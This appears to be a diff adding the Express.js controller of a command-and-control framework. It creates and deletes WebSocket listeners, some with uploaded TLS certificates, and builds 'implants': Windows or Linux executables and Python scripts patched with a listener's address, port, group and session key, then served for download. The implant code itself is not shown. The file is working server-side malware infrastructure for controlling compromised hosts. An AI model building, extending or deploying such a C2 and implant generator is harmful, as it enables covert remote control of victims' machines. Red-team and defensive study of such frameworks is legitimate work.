@@ -1,0 +1,402 @@
+import { response } from "express";
+import Listener from '../models/Listener_model.mjs';
+import { fileURLToPath } from 'url';
+import fs from 'fs/promises';
+import { rm, mkdir, writeFile } from 'fs/promises';
+import  path from 'path';
+import  {resolve} from 'path';
+import { set_server, set_ssl_server } from "../Servers/http_servers.mjs";
+import { writeLog } from "../Utils/writeLog.mjs";
+import { exe_processing, python_processing } from "../Utils/implant_processing.mjs";
+import { isValidPEM } from "../Utils/ssl_verify.mjs";
+import SessKey from "../models/SessionKey_model.mjs";
+
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+
+const create_listener = async (req, res = response, attacks_running, agents, status_connections, listeners) => {
+
+
+    try {
+
+        
+        let { type = "ws", bind = "0.0.0.0", port = 0, url="localhost", ssl_tls=false} = req.body;
+        
+        port = Number(port);
+        ssl_tls = Boolean(ssl_tls);
+
+        if(port < 1 || port > 65535){
+            return res.status(400).json({
+                ok: false,
+                msg: "Port must be between 1 and 65535"
+            });
+        }
+
+        if(url.length <=0){
+            return res.status(400).json({
+                ok: false,
+                msg: "URL cannot be empty"
+            });
+        }
+
+        if (type.length <= 0 || bind.length <= 0 || port === 0) {
+            return res.status(400).json({
+                ok: false,
+                msg: "Fields shouldn't be empty"
+            });
+        }
+
+        const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}$/;
+        if (!ipv4Regex.test(bind)) {
+            return res.status(400).json({
+                ok: false,
+                msg: "'bind' must be a valid IPv4 address."
+            });
+        }
+
+        if (type != "ws" ) {
+            return res.status(400).json({
+                ok: false,
+                msg: "Invalid type"
+            });
+        }
+
+
+        const found_listener = await Listener.findOne({ type, port });
+
+        if (found_listener) {
+            return res.status(400).json({
+                ok: false,
+                msg: "Listener already exists"
+            })
+        }
+
+                
+        if(ssl_tls){
+            
+            const files = req.files;
+            
+            if (!files.cert || !files.key){
+                return res.status(400).json({
+                    ok: false,
+                    msg:"cert & key are required"
+                })
+            }
+    
+            const certBuffer = files.cert[0].buffer;
+            const keyBuffer = files.key[0].buffer;
+            let caBuffer=undefined;
+            const date = new Date();
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            const timestamp = `${day}-${month}-${year}-${port}`;
+
+            const name = path.basename(timestamp);
+        
+            const basePath = path.join(__dirname, '../certs');
+            const newDirPath = path.join(basePath, name);
+        
+
+
+            if (certBuffer.length > 0 && keyBuffer.length > 0) {
+
+                if (!isValidPEM(certBuffer.toString(), "cert")) {
+                    return res.status(400).json({ ok: false, msg: "Invalid certificate" });
+                }
+                if (!isValidPEM(keyBuffer.toString(), "key")) {
+                    return res.status(400).json({ ok: false, msg: "Invalid key" });
+                }
+
+                await mkdir(newDirPath, { recursive: true });
+
+                await writeFile(path.join(newDirPath, "cert.pem"), certBuffer);
+                await writeFile(path.join(newDirPath, "key.pem"), keyBuffer);
+
+                if (caBuffer) {
+                    await writeFile(path.join(newDirPath, "ca.pem"), caBuffer);
+                }
+
+            } else {
+                return res
+                .status(400)
+                .json({ ok: false, msg: "Size buffers errors" });
+            }
+
+
+            const new_listener = new Listener({  type, bind, url, port, ssl_tls, path_cert:newDirPath });
+    
+            await new_listener.save();
+
+            const ssl_listener = await set_ssl_server(bind, port, newDirPath, attacks_running, agents, status_connections);
+            listeners.listeners.push(ssl_listener);
+
+            writeLog(` | New listener added in port ${port} `)
+            
+            return res.status(200).json({
+                ok: true,
+                msg: "New listener added"
+            })
+
+        }
+
+        const new_listener = new Listener({  type, bind, url, port, ssl_tls });
+        await new_listener.save();
+
+        
+        const listener = await set_server(bind, port, attacks_running, agents, status_connections);
+        listeners.listeners.push(listener);
+
+        writeLog(` | New listener added on port ${port} `)
+        return res.status(200).json({
+            ok: true,
+            msg: "New listener added."
+        })
+
+
+
+    } catch (error) {
+        
+        return res.status(400).json({
+            ok: false,
+            msg: "Error creating listener."
+        })
+    }
+
+}
+
+
+
+const get_listener=async( req, res = response) => {
+
+    
+    try {
+        
+        const listeners = await Listener.find().select('bind type port url ssl_tls');
+
+        return res.status(200).json({
+            ok: true,
+            listeners
+        })
+        
+    } catch (error) {
+        
+        return res.status(400).json({
+            ok: false,
+            msg: "Error fetching listeners."
+        })
+    }
+
+    
+};
+
+
+
+const delete_listener= async( req, res = response, listeners) => {
+
+    
+    try {
+        const { type = "", bind = "", port_to_delete } = req.body; 
+        
+        if (type.length <= 0 || bind.length <= 0) {
+            return res.status(400).json({
+                ok: false,
+                msg: "Missing required fields."
+            });
+        }
+
+        if (type !== "ws") {
+            return res.status(400).json({
+                ok: false,
+                msg: "Invalid type."
+            });
+        }
+
+        
+        const found_listener = await Listener.findOne({ port: port_to_delete });
+
+        if (!found_listener) {
+            console.log("Listener does not exist.");
+            return res.status(400).json({
+                ok: false,
+                msg: "Listener does not exist."
+            });
+        }
+
+
+        for(let i=0; i < listeners.listeners.length; i++){
+
+
+            if(listeners.listeners[i].port === port_to_delete){
+                const { http_server="", ws="", port=0 } = listeners.listeners[i];
+
+                try {
+                    http_server.close(() => console.log(`HTTP server on port ${port} deleted.`))
+                } catch (error) {
+
+                    console.log("Error deleting HTTP server:", error);
+                    return res.status(400).json({
+                        ok: false,
+                        msg: "Error deleting HTTP server. There may be pending connections."
+                    });
+                }
+                try {
+                    ws.close(() => console.log(`WebSocket server on port ${port} deleted.`))
+                } catch (error) {
+                    console.log("Error deleting WebSocket server:", error);
+                    return res.status(400).json({
+                        ok: false,
+                        msg: "Error deleting WebSocket server. There may be pending connections."
+                    });
+                }
+
+                listeners.listeners.splice(i,1);
+                break;
+            }
+        }
+        
+
+        await Listener.findByIdAndDelete(found_listener._id);
+
+
+        if(found_listener.ssl_tls){
+            try {
+                const folder = resolve(found_listener.path_cert); 
+                await rm(folder, { recursive: true, force: true });
+            } catch (error) {
+                console.error('Error deleting certs folder:', error);
+            }
+        }
+        
+
+        return res.status(200).json({
+            ok: true,
+            msg: "Listener deleted."
+        });
+        
+    } catch (error) {
+        
+        return res.status(400).json({
+            ok: false,
+            msg: "Error deleting listener."
+        });
+    }
+
+    
+};
+
+
+const create_implant_controller = async(req, res=response)=>{
+
+    try {
+        const { type="", system="", arch="", listener=0, group="default", sess_key="" } = req.body;
+
+
+        let implant_path="";
+
+        if (arch !== "x64") return res.status(400).json({
+            ok: false,
+            msg: "Invalid architecture. Only x64 is supported."
+        });
+
+        if (sess_key.length < 10) return res.status(400).json({
+            ok: false,
+            msg: "Session key must have 10 or more characters."
+        });
+
+        switch (system) {
+            case "linux":
+                implant_path = `./Implants/linux`;
+                break;
+            case "windows":
+                implant_path = `./Implants/windows`;
+                break;
+            default:
+                return res.status(400).json({
+                    ok: false,
+                    msg: "Invalid system."
+                });
+        }
+
+
+        const found_sess_key = await SessKey.findOne({sess_key});
+
+        if (!found_sess_key) return res.status(400).json({
+            ok: false,
+            msg: "Invalid session key."
+        });
+
+        const found_listener = await Listener.findOne({ port: listener });
+
+        if (!found_listener) {
+            return res.status(400).json({
+                ok: false,
+                msg: "Listener does not exist."
+            });
+        }
+
+
+        switch (found_listener.ssl_tls) {
+            case true:
+                implant_path = `${implant_path}/ssl`;
+                break;
+            case false:
+                implant_path = `${implant_path}/no_ssl`;
+                break;
+            default:
+                return res.status(400).json({
+                    ok: false,
+                    msg: "Invalid database listener type."
+                });
+        }
+
+
+        let result_path;
+
+        let ext;
+
+        switch (type) {
+            case "exe":{
+                ext = system === "windows" ? "exe" : "elf"
+                implant_path = `${implant_path}/exe/base_${arch}.${ext}`;
+                implant_path = path.normalize(implant_path);
+                result_path = await exe_processing(implant_path, found_listener.url, found_listener.port, group, system, sess_key)
+                break;
+            }
+            case "py":{
+                implant_path = `${implant_path}/python/base.py`;
+                implant_path = path.normalize(implant_path);
+                result_path = await python_processing(implant_path, found_listener.url, found_listener.port, group, sess_key)
+                ext='py'
+                break;
+            }
+            default:
+                return res.status(400).json({
+                    ok: false,
+                    msg: "Invalid type."
+                });
+            }
+
+        
+        result_path = path.join(__dirname , result_path);
+        const data = await fs.readFile(result_path);
+        res.writeHead(200,{
+            'Content-Type': 'application/octect-stream',
+            'Content-Disposition': `attachment; filename="file.${ext}"`,
+            'Content-Length': data.length,
+        })
+        res.end(data)
+
+
+
+    } catch (error) {
+        
+    res.writeHead(500);
+    res.end('Error.')
+    }
+}
+
+
+export { create_listener, delete_listener, get_listener, create_implant_controller };
